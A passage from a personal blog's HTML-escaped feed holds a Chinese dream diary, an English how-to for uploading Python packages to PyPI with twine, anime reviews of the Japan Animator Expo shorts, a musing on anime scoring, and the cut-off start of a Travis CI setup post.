我走到同学的身旁， 向他表达了暂时存放一下我的鱼的请求， 他同意了。 我开始小小翼翼从鱼嘴上取下带着倒刺的鱼钩。 从它被钓上来开始已经过去一段时间了， 它在我手里的挣扎幅度越来越小， 可是到现在我也还是没能取下鱼钩， 最后， 鱼不动了， 眼看着是要不活了。这时，我同学一把夺过我手里的鱼， 另一只手拉住鱼线， 使劲一拔， 鱼钩连同着半片鱼唇一同飞出。&lt;br /&gt;
他将鱼还给了我， 那半片鱼唇飞到天上的场景还历历在目， 我问他， 这样会不会太粗暴了， 他笑道， 鱼哪懂？  &lt;/p&gt;
&lt;p&gt;我把鱼放到了水里， 可是它一动也不动了。&lt;br /&gt;
死了么？我问道。&lt;br /&gt;
同学瞟了一眼， 没事， 命硬着呢。  &lt;/p&gt;
&lt;p&gt;过了一会儿， 鱼动了一下， 好像是打了一个寒颤， 之后又欢快的游了起来。  &lt;/p&gt;
&lt;p&gt;放下心后， 我去到存放木桶的地方， 发现脸盆和木桶早已取尽， 今天来钓鱼的人很多，这下我无计可施了， 想了想， 去向刚才的同学借那个细长的木桶吧。  &lt;/p&gt;
&lt;p&gt;来来回回了好几趟， 终于可以把鱼带回去了， 我把细长的木桶侵入水里， 抽出来时觉得格外的轻， 定睛一看， 发现下面打满了洞， 这哪里是木桶， 这是捞鱼用的捞勺啊。  &lt;/p&gt;
&lt;p&gt;我独自苦笑， 转身寻找女孩， 向他举了举我的捞勺， 自嘲了几句。&lt;br /&gt;
不远处， 女孩在和一个男生嬉笑着聊天， 她向我回了一个微笑， 接着继续投入到和男生的谈笑中， 我不知道他们在谈论什么， 我看到她笑得腰都弯了， 可是我听不到他们的声音，明明隔得不远。  &lt;/p&gt;
&lt;p&gt;我突然发现天色已经很晚了， 晚霞早已不见， 留下雾沉沉的黑暗， 地上泛着些许的银光，透过雾气， 有些朦胧。  &lt;/p&gt;
&lt;p&gt;我想， 回家吧。  &lt;/p&gt;
&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;p&gt;. . . . . .&lt;/p&gt;
&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;p&gt;和女孩站在电梯里， 看着电梯的门缓缓的关上——最终， 我还是发现了一个木桶， 带着鱼去女孩家吃晚饭了。—— 女孩在电梯楼层上面按了一下， 我才发现， 这栋楼好高， 我看到楼层按钮的左下角写着13， 我才想起我应该和我妈打个电话， 告诉他我不回去吃饭了。  &lt;/p&gt;
&lt;p&gt;电梯开始上升， 我拨通了我妈的电话。&lt;br /&gt;
『喂， 妈， 我今天晚上不回去吃饭了....我去， 去...额...』  &lt;/p&gt;
&lt;p&gt;我把电话拿开， 扭过头来看着女孩， 向她问道：&lt;br /&gt;
『你算是我的女朋友么？』  &lt;/p&gt;
&lt;p&gt;&lt;br&gt; &lt;/p&gt;
&lt;p&gt;梦醒了。&lt;/p&gt;
&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;p align='right'&gt;2016年06月05日， 记昨天晚上做的一个梦。&lt;/p&gt;&lt;/em&gt;&lt;/p&gt;</summary><category term="日记"></category><category term="里人格"></category><category term="瞎扯"></category></entry><entry><title>How to upload package to pypi</title><link href="http://littlezz.github.io/how-to-upload-package-to-pypi.html" rel="alternate"></link><updated>2016-05-15T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-05-15:how-to-upload-package-to-pypi.html</id><summary type="html">&lt;h2 id="install-twine"&gt;&lt;a name="user-content-install-twine" href="#install-twine" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Install twine&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;pip install twine&lt;/code&gt;&lt;/p&gt;
&lt;h2 id="init-file"&gt;&lt;a name="user-content-init-file" href="#init-file" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Init file&lt;/h2&gt;
&lt;p&gt;First of all, make sure that the structure of project is correct. Says, your project code in a folder call 'foo', then you have &lt;code&gt;README&lt;/code&gt; and some other files in the same level.  &lt;/p&gt;
&lt;p&gt;For example, &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;.
├── foo
│   └── a.py
└── readme.md
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Secondly, add specify file to the root folder.  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;README.rst  &lt;/li&gt;
&lt;li&gt;MANIFEST.in  &lt;/li&gt;
&lt;li&gt;setup.py  &lt;/li&gt;
&lt;li&gt;setup.cfg(option)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;pypi do not know markdown format readme, there is only rst format available.&lt;/p&gt;
&lt;h2 id="setuppy"&gt;&lt;a name="user-content-setuppy" href="#setuppy" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;setup.py&lt;/h2&gt;
&lt;p&gt;look at&lt;br /&gt;
&lt;a href="https://github.com/pypa/sampleproject/blob/master/setup.py"&gt;https://github.com/pypa/sampleproject/blob/master/setup.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;after finish &lt;code&gt;setup.py&lt;/code&gt;&lt;br /&gt;
you can use   &lt;/p&gt;
&lt;p&gt;&lt;code&gt;pip install -e .&lt;/code&gt;&lt;br /&gt;
install package locally on editable mode.&lt;br /&gt;
It will also install dependency.  &lt;/p&gt;
&lt;h2 id="make-dist"&gt;&lt;a name="user-content-make-dist" href="#make-dist" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Make dist&lt;/h2&gt;
&lt;h3 id="build-source-distribution"&gt;&lt;a name="user-content-build-source-distribution" href="#build-source-distribution" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Build source distribution&lt;/h3&gt;
&lt;p&gt;run&lt;br /&gt;
&lt;code&gt;python setup.py sdist&lt;/code&gt;  &lt;/p&gt;
&lt;h3 id="build-wheel"&gt;&lt;a name="user-content-build-wheel" href="#build-wheel" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Build wheel.&lt;/h3&gt;
&lt;p&gt;If your code compat py2 and py3.&lt;br /&gt;
&lt;code&gt;python setup.py bdist_wheel --universal&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;else, &lt;br /&gt;
&lt;code&gt;python setup.py bdist_wheel&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;if your code is specify for some python version, add python tag in &lt;code&gt;setup.cfg&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;For example, if your code is only available in py3.5 and 3.4 &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[bdist_wheel]&lt;/span&gt;
&lt;span class="na"&gt;python-tag&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;py35, py34&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2 id="upload"&gt;&lt;a name="user-content-upload" href="#upload" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Upload&lt;/h2&gt;
&lt;p&gt;look at &lt;a href="http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/#uploading-your-project-to-pypi"&gt;http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/#uploading-your-project-to-pypi&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;Create a account on pypi, register your package,  write a &lt;code&gt;~/.pypirc&lt;/code&gt; &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[distutils]&lt;/span&gt;
&lt;span class="na"&gt;index-servers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;pypi&lt;/span&gt;

&lt;span class="k"&gt;[pypi]&lt;/span&gt;
&lt;span class="na"&gt;repository&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;https://pypi.python.org/pypi&lt;/span&gt;
&lt;span class="na"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;lt;username&amp;gt;&lt;/span&gt;
&lt;span class="na"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;lt;password&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;left the password empty, you can use twine with &lt;code&gt;-p PASSWORD&lt;/code&gt;.  &lt;/p&gt;
&lt;p&gt;upload your dist folder  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;twine upload dist/*&lt;/code&gt;  &lt;/p&gt;
&lt;h2 id="reference"&gt;&lt;a name="user-content-reference" href="#reference" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/"&gt;http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://peterdowns.com/posts/first-time-with-pypi.html"&gt;http://peterdowns.com/posts/first-time-with-pypi.html&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2016-05-15 11:43:33&lt;/p&gt;</summary><category term="python"></category><category term="小结"></category></entry><entry><title>日本动画人展览会总结与推荐</title><link href="http://littlezz.github.io/ri-ben-dong-hua-ren-zhan-lan-hui-zong-jie-yu-tui-jian.html" rel="alternate"></link><updated>2016-04-21T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-04-21:ri-ben-dong-hua-ren-zhan-lan-hui-zong-jie-yu-tui-jian.html</id><summary type="html">&lt;p&gt;首先， 不得不提关于这个展览会的纪录片 《庵野先生与我们的莽撞挑战 日本动画人展览会》  &lt;/p&gt;
&lt;p&gt;5分钟的动画， 制作时间往往是好几个月， 途中经历的种种困难， 特别是对于新人监督， 经验不足，在现场时的时候很难控制场面。比如第32话的监督， 在配音时说希望林原惠用更成熟一点的语气， 结果林原惠反问『请问监督眼中的成熟是什么呢？ 我没有从人物的脸上看到成熟的气质。』。 然后监督直接吓懵逼，一个工作人员默默递给监督一个红绿按钮的选择键盘，全场没有人敢讲话， 只有监督不断翻着台本的声音。   最后还是林原惠救场， 说在刚才的基础上用更低沉的语气。 监督说很好， 这样就好。 &lt;/p&gt;
&lt;p&gt;旁白一针见血的说『现在监督一点很后悔吧』。&lt;br /&gt;
但是很多问题最后可能只能妥协。&lt;br /&gt;
毕竟学会妥协也是成为优秀监督的必要能力。。。。  &lt;/p&gt;
&lt;p&gt;好了， 开始记录那些我喜欢的作品吧。&lt;br /&gt;
基于看过纪录片的原因， 我先说32话， 之后的按顺序。  &lt;/p&gt;
&lt;h3 id="32"&gt;&lt;a name="user-content-32" href="#32" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;32 新世紀いんぱくつ。&lt;/h3&gt;
&lt;p&gt;和eva是同一个时间观的， 我特别去看了之前监督和林原惠意见冲突的地方， 讲道理， 其实还是林原惠说得对。。。&lt;del&gt;那张脸上面看不出所谓的成熟&lt;/del&gt;&lt;br /&gt;
然后歌很好听， 非常好听， 背景也非常美，再配上百合， 百合！百合！林原精分现场！自己和自己百合！！  我吼兴奋， 我吼兴奋啊啊啊啊啊啊啊啊啊啊wwww， 可以循环看好多遍。 &lt;br /&gt;
&lt;del&gt;我的偶像不可能变成橙汁&lt;/del&gt;  &lt;/p&gt;
&lt;h3 id="1"&gt;&lt;a name="user-content-1" href="#1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;1 龍の歯医者&lt;/h3&gt;
&lt;p&gt;恢弘大作的感觉， 嗯， BGM也很恢弘， 作画也很酷炫。  &lt;/p&gt;
&lt;h3 id="2-hill-climb-girl"&gt;&lt;a name="user-content-2-hill-climb-girl" href="#2-hill-climb-girl" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;2 HILL CLIMB GIRL&lt;/h3&gt;
&lt;p&gt;感觉上是秀3D技术的， 然而我觉得里面的歌曲很好听。  &lt;/p&gt;
&lt;h3 id="3-mememe"&gt;&lt;a name="user-content-3-mememe" href="#3-mememe" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;3 ME!ME!ME!&lt;/h3&gt;
&lt;p&gt;这个不用说了， 很多人说神作啦， 和EVA说的是一个事情啦， 更加容易懂啦， 实用啦。 各种各样。&lt;br /&gt;
想要补充的就是其实庵野是没有参与进来的。。。&lt;br /&gt;
蛮好看的， 值得一看。 卖肉新高度。而且很带感。有很多符号元素。 总之看得开心就是好的。 &lt;/p&gt;
&lt;h3 id="4-carnage"&gt;&lt;a name="user-content-4-carnage" href="#4-carnage" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;4 Carnage&lt;/h3&gt;
&lt;p&gt;和上一个作品形成鲜明的对比。 &lt;br /&gt;
这部作品非常有表现力。&lt;br /&gt;
《ME!ME!ME!》 的主题是美少女， 而这部作品的主题是表现故事， 人物和剧情， 都只是表现的手段而已。 当然很多人可能会说『这画风我不喜欢』。 然后结束观看， 然后接着对mememe撸。  &lt;/p&gt;
&lt;p&gt;可是我tm真的好喜欢！&lt;br /&gt;
那帅到炸裂的分镜， 没有矫揉造作的卖萌，一股浓浓的黑暗风格。 干净利落， 没有多余的台词， 关键的剧情全部用镜头来表达。  &lt;/p&gt;
&lt;p&gt;这他妈就是艺术品啊。  &lt;/p&gt;
&lt;p&gt;《ME!ME!ME!》确实取得了很高的人气， 如果是真的变成作品放送的话， 多半情况下也是ME!ME!ME!》热卖， 而本作暴死。  &lt;/p&gt;
&lt;p&gt;但是总得有人做像《Carnage》这样的动画， 这种东西才称得上是所谓的『动画未来』。 其他的像《mememe》这种模式，商业运作成功， 无可厚非， 毕竟卖bd卖人设，赚了钱活下去才是王道。 但是如果一辈子都干这种事情，而且还时不时披上一个『内涵作』这样的外衣的话，我觉得真的是有点的恶心。  &lt;/p&gt;
&lt;h3 id="6-202ldk2"&gt;&lt;a name="user-content-6-202ldk2" href="#6-202ldk2" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;6 西荻窪駅徒歩20分2LDK敷礼2ヶ月ペット不可&lt;/h3&gt;
&lt;p&gt;和第四话一样， 剧情非常有趣， 动作非常非常的流畅， 非常推荐。  这部作品在纪录片里面有提到。  &lt;/p&gt;
&lt;h3 id="10"&gt;&lt;a name="user-content-10" href="#10" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;10 ヤマデロイド&lt;/h3&gt;
&lt;p&gt;这个也很好看， 配合一首歌曲讲了一个故事， 节奏非常带感， 而且没有对白， 全部用镜头语言来讲故事， 比现在的一些动画恨不得配角24小时全程解说不知道要高到哪里去。  &lt;/p&gt;
&lt;p&gt;但是有一点， 这个人脸的画风， 23333 不行， 我一开始以为是要全程颜艺， 但是看旧了好像还是蛮带感的。  &lt;/p&gt;
&lt;p&gt;总之很推荐， 剧情也很有爱。  &lt;/p&gt;
&lt;h3 id="11-power-plant-no33"&gt;&lt;a name="user-content-11-power-plant-no33" href="#11-power-plant-no33" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;11 POWER PLANT No.33&lt;/h3&gt;
&lt;p&gt;Trigger， 今石洋之办的那家工作室。&lt;br /&gt;
科幻类的，没什么要说的， 值得一看。 ed很好听。  &lt;/p&gt;
&lt;h3 id="12-evangelion-another-impactconfidential"&gt;&lt;a name="user-content-12-evangelion-another-impactconfidential" href="#12-evangelion-another-impactconfidential" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;12 [evangelion： Another Impact（Confidential）&lt;/h3&gt;
&lt;p&gt;卧槽， 说老实话， 我光看画面我真的分不清到底是3D的还是特摄片。  &lt;/p&gt;
&lt;p&gt;怕了。  &lt;/p&gt;
&lt;h3 id="13-kanon"&gt;&lt;a name="user-content-13-kanon" href="#13-kanon" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;13 Kanón&lt;/h3&gt;
&lt;p&gt;和其他的不同， 这部全程在说话， 应该是讨论一些东西， 可能是讨论作品和观众的问题吧。&lt;br /&gt;
看得下去的话可以一看。  &lt;/p&gt;
&lt;h3 id="14-sexviolence-with-machspeed"&gt;&lt;a name="user-content-14-sexviolence-with-machspeed" href="#14-sexviolence-with-machspeed" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;14 Sex&amp;amp;VIOLENCE with MACHSPEED&lt;/h3&gt;
&lt;p&gt;我是看完这部才想着搞一个总结的。&lt;br /&gt;
我最近遇上一些讨厌的事情， 没有什么道理可以讲， 对面只会不断的追问『你为什么』 和『你凭什么』。 就像这部作品所表达的东西一样： 没有为什么， 我tm就是要为之一战。&lt;/p&gt;
&lt;p&gt;这可能是现在无可奈何的我内心深处非常羡慕敢想而不敢讲的东西吧。  &lt;/p&gt;
&lt;p&gt;2016年04月21日21:41:15   &lt;/p&gt;
&lt;h3 id="15"&gt;&lt;a name="user-content-15" href="#15" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;15 おばけちゃん&lt;/h3&gt;
&lt;p&gt;2333&lt;br /&gt;
好有趣， 前面都是一点蠢萌蠢萌的片段，全都是neta， 但是如果坚持到最后， 会有好的收获的。  &lt;/p&gt;
&lt;p&gt;而且， ed是重点， 最后出现了鹤卷和哉！&lt;/p&gt;
&lt;h3 id="16"&gt;&lt;a name="user-content-16" href="#16" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;16&lt;/h3&gt;
&lt;p&gt;这什么鬼。。。&lt;br /&gt;
剧情一头雾水， 然后各种风格的混搭， 设定的不明。&lt;br /&gt;
总之我觉得不好看。&lt;/p&gt;
&lt;h3 id="17"&gt;&lt;a name="user-content-17" href="#17" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;17 三本の証言者&lt;/h3&gt;
&lt;p&gt;卧槽， 居然是剧情片， 短篇+剧情=很难看懂。&lt;br /&gt;
不过还是值得一看的。  &lt;/p&gt;
&lt;h3 id="19-i-can-friday-by-day"&gt;&lt;a name="user-content-19-i-can-friday-by-day" href="#19-i-can-friday-by-day" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;19 I can Friday by day!&lt;/h3&gt;
&lt;p&gt;卧槽！！！&lt;br /&gt;
我就是在找这个啊，  监督是 &lt;strong&gt;鹤卷和哉&lt;/strong&gt; !重复一遍， 监督是鹤卷和哉！ &lt;/p&gt;
&lt;p&gt;别废话了， 抓紧看吧， 和flcl一样的感觉， 猜不到开头， 更加猜不到结尾。&lt;/p&gt;
&lt;p&gt;2016年04月22日03:20:30&lt;/p&gt;
&lt;h3 id="22"&gt;&lt;a name="user-content-22" href="#22" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;22 イブセキヨルニ&lt;/h3&gt;
&lt;p&gt;这个东西讨论到政治了。&lt;br /&gt;
和我当初看这个博览会的注重点不同， 不过老实话， 监督脑洞真是大， 真敢拍啊。  &lt;/p&gt;
&lt;p&gt;没看的话可以看一下。  &lt;/p&gt;
&lt;h3 id="25"&gt;&lt;a name="user-content-25" href="#25" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;25 ハンマーヘッド&lt;/h3&gt;
&lt;p&gt;妈的， 一股沙耶之歌的感觉。&lt;br /&gt;
卧槽， 还是给我看一集萌妹中和一下吧我的天， 这从20 开始的一系列都是药吃多了么。  &lt;/p&gt;
&lt;p&gt;和前面一样， 没看的话可以看一下。  &lt;/p&gt;
&lt;h3 id="26-1989"&gt;&lt;a name="user-content-26-1989" href="#26-1989" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;26 コント  ころしや　1989&lt;/h3&gt;
&lt;p&gt;这个很有趣。 简直是超展开。  &lt;/p&gt;
&lt;h3 id="29"&gt;&lt;a name="user-content-29" href="#29" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;29 ヒストリー機関&lt;/h3&gt;
&lt;p&gt;可以一看。&lt;br /&gt;
一开始看我以为又是政治片， 结果看到后面发现是脑洞片。&lt;br /&gt;
说老实话， 我比较想看的是表现手法， 即， 我认为， 举办这个活动的目的是抛开商业， 抛开蓝光销量， 抛开各种制约，你会怎么做动画片，你会用什么样的形式你有什么样没有敢实践的创意。 而不是一说到自由创作， 就想方设法展现自己对政治对人类历史的洞见，找一些看似高深的角度， 然后做一下浅薄幼稚的讨论。&lt;br /&gt;
有些东西， 需要去看书去明白， 而不是看几集动画片就能说清楚的， 拼命的传达自己的见解， 丧失了最基础的娱乐性， 只剩说教， 那观众为何不去看公开课？&lt;br /&gt;
（&lt;del&gt;没错， 我说的就是那种整天一副讨论正义是什么的动画&lt;/del&gt;） &lt;/p&gt;
&lt;h3 id="31-girl"&gt;&lt;a name="user-content-31-girl" href="#31-girl" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;31 GIRL&lt;/h3&gt;
&lt;p&gt;和mememe一样的团队做的（没错， 就是那两个人）.&lt;br /&gt;
本来没什么好说的， 但是想了一下， 那个眼睛的画法真的很好的表达了人物一副不知道在想什么而且还很容易冷场的形象。&lt;br /&gt;
而且我感觉这个画面实在是太华丽了吧。 我的天。  &lt;/p&gt;
&lt;h3 id="34"&gt;&lt;a name="user-content-34" href="#34" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;34 旅のロボから&lt;/h3&gt;
&lt;p&gt;卧槽， 监督在业界是被称为师匠的男人。&lt;br /&gt;
真的是不一样啊。mememe的作画监督说自己非常崇拜他， 说他有某种特别的特质， 才能画出这样工口感这么强的画。&lt;br /&gt;
我感觉这个人对生活的观察非常的细腻。 如果说mememe的作者在发掘美少女设计上面独树一帜的话， 那么本作的监督则是在美少女的动作方面达到了超一流。  &lt;/p&gt;
&lt;p&gt;里面美少女的动作， 非常的流畅， 非常的写实，所以能够让人感觉『生动』。&lt;br /&gt;
之前有个笑话是嘲笑部分画师画妹子泡温泉的时候头发是披下来的， 说可怜的死宅， 连妹子的手都没有摸过2333.&lt;br /&gt;
那么本作的监督绝对是那种知道要让妹子把头发盘起来， 同时还能把怎么盘的具体动作画出来，而且还画得超乎想象的优雅的那种。  &lt;/p&gt;
&lt;p&gt;不愧是『师匠』  &lt;/p&gt;
&lt;p&gt;这种感觉， 就想白箱里面的那个老一代的画师， 基础功扎实到可怕， 不是现在的画师能够随便超越的那种存在。  &lt;/p&gt;
&lt;p&gt;&lt;del&gt;我觉得特别的特质之一是人家有女朋友吧喂！&lt;/del&gt;&lt;/p&gt;
&lt;h3 id="35"&gt;&lt;a name="user-content-35" href="#35" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;35 カセットガール&lt;/h3&gt;
&lt;p&gt;这个。。。这个。。 这个是向庵野秀明毕业作品致敬么？  &lt;/p&gt;
&lt;p&gt;2016年04月25日00:02:40&lt;/p&gt;
&lt;h3 id="_1"&gt;&lt;a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;最后&lt;/h3&gt;</summary><category term="日记"></category><category term="瞎扯"></category></entry><entry><title>关于《我不在的街道》评分的一点思考</title><link href="http://littlezz.github.io/guan-yu-wo-bu-zai-de-jie-dao-ping-fen-de-yi-dian-si-kao.html" rel="alternate"></link><updated>2016-04-04T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-04-04:guan-yu-wo-bu-zai-de-jie-dao-ping-fen-de-yi-dian-si-kao.html</id><summary type="html">&lt;p&gt;我给了9分（神作）  &lt;/p&gt;
&lt;p&gt;刚看完的时候， 对于那个操蛋的结尾， 我也是想打七分的， 但是觉得实在太低， 对不起那个惊艳的开头， 于是给八分。  &lt;/p&gt;
&lt;p&gt;过了1天， 我连续半话弃掉了3部番， 其中包括《fate stay night UBW》， 我在群里面说， 『不行， 刚看完扑街， 其他番根本没有办法看， 全部半话弃』&lt;br /&gt;
直到此刻， 我才明白， 有多少番， 我甚至没有办法看完第一话， 更不用说考虑什么剧情了。  &lt;/p&gt;
&lt;p&gt;我开始察觉到自己， 以及大部分人的可笑。&lt;br /&gt;
一副严肃认真， 公平正义的态度， 打上一个完全主观的分数， 留下一句似是而非的自己评分准则。&lt;br /&gt;
俨然一副资深人士的样子。  &lt;/p&gt;
&lt;p&gt;然而来来回回， 不还是局限在剧情方面？&lt;br /&gt;
一部动画， 构图， 分镜， 配音， 上色， 配乐等等， 这么多元素在里面， 最后大家却振振有词的依据剧情来打分， 还能说得头头是道。  &lt;/p&gt;
&lt;p&gt;我才明白当时的我也是如此， 也就是在那时， 我才会想起我起初看这个动画的时候的兴奋之情， 我大呼卧槽， 我呼啦一下打开房间的门， 我走到从来不看番的室友的房间， 我说， 卧槽， 我要通宵看完这部番了， 我已经有几年没有这种想要通宵看番的冲动了， 上一次这样还是高中， 看得是石头门。&lt;br /&gt;
我在一集结束的时候， 高呼悠木碧， 棒啊啊啊啊。 我说， fuck them all！ 到后面， 我室友都跑过来我们两个熬夜看番了。  &lt;/p&gt;
&lt;p&gt;也就是那时， 我才会想起， 有多少回， 我被里面的一幕触动到， 我说， 就凭此刻， 足以封神。   &lt;/p&gt;
&lt;p&gt;所以我改成了9分， 为了我当初的承诺， 为了第二话那句『原来我也有过这样的时间啊』， 为了在记录那时感想时触动的回忆让我流着泪写完观后感。  &lt;/p&gt;
&lt;p&gt;如果此刻我还保持着一副正人君子， 道貌岸然， 满口胡言的扯着剧情的『公平之人』， 那我就是一个双料的傻瓜。  &lt;/p&gt;
&lt;p&gt;干他娘的， 我就是要给9分， 有傻逼打低分， 为什么我就不能打高分？  &lt;/p&gt;
&lt;p&gt;说到底， 为什么作品的排名会被高低分这种东西牵制。 或者说如何排除傻逼对一个作品的影响。  &lt;/p&gt;
&lt;p&gt;投票者投票表决天才， 但是有一个前提是， 如何保证投票者本身不是平庸之流。  &lt;/p&gt;
&lt;p&gt;抛开知乎这种社交性质的网站不谈， 如果是这种个人评分性质，带有很重的个人主观口味性质的，但是最后却是统计平均数的网站来看。 应该首先匹配评分者中和当前用户匹配率高的用户， 重新分配权重。  &lt;/p&gt;
&lt;p&gt;咦， 这不就是协同过滤么。。。  &lt;/p&gt;
&lt;p&gt;说来， 要先解决计算用户之间的距离的问题， 然后重新分配权重， 然后重新得到分数， 卧槽， 简单啊。  &lt;/p&gt;
&lt;p&gt;我是不是可以去写一个啊。。。？  &lt;/p&gt;
&lt;p&gt;看情况， 先把之前的坑给填了先。  &lt;/p&gt;
&lt;p&gt;2016年04月04日19:37:51&lt;/p&gt;</summary><category term="日记"></category><category term="瞎扯"></category><category term="小结"></category></entry><entry><title>Travis CI with Numpy and Pytest</title><link href="http://littlezz.github.io/travis-ci-with-numpy-and-pytest.html" rel="alternate"></link><updated>2016-03-31T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-03-31:travis-ci-with-numpy-and-pytest.html</id><summary type="html">&lt;p&gt;It takes long time to install scientific python package by &lt;code&gt;pip&lt;/code&gt; in travis and sometime fail.  &lt;/p&gt;
&lt;p&gt;The solve is to use conda to install binary package. &lt;br /&gt;
&lt;a href="http://conda.pydata.org/docs/travis.html"&gt;http://conda.pydata.org/docs/travis.html&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;Note that some package not in conda, you can use &lt;code&gt;pip&lt;/code&gt; install it, for example, &lt;code&gt;py.test&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;Here is my &lt;a href="https://github.com/littlezz/ESL-Model"&gt;ESL-Model&lt;/a&gt; .trais.yml, you can view on github &lt;a href="https://github.com/littlezz/ESL-Model/blob/master/.travis.yml"&gt;https://github.com/littlezz/ESL-Model/blob/master/.travis.yml&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;language: python
python:
  &lt;span class="c1"&gt;# We don&amp;#39;t actually use the Travis Python, but this keeps it organized.&lt;/span&gt;
  - &lt;span class="s2"&gt;&amp;quot;3.5&amp;quot;&lt;/span&gt;

install:
